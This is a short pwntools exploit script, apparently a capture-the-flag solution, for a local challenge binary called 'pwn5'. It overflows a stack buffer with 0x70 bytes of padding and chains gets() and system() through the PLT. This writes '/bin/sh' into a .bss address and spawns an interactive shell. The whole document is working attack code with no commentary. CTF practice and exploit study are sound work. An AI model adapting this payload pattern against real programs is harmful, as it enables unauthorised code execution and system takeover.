from pwn import *

context.log_level = 'debug'
io = process('./pwn5')
elf = ELF('./pwn5')

sys_addr = elf.plt['system']
gets_addr = elf.plt['gets']
bss_addr = 0x0804A080
payload = cyclic(0x70) + p32(gets_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr)

io.recv()
io.sendline(payload)
io.sendline('/bin/sh')
io.interactive()
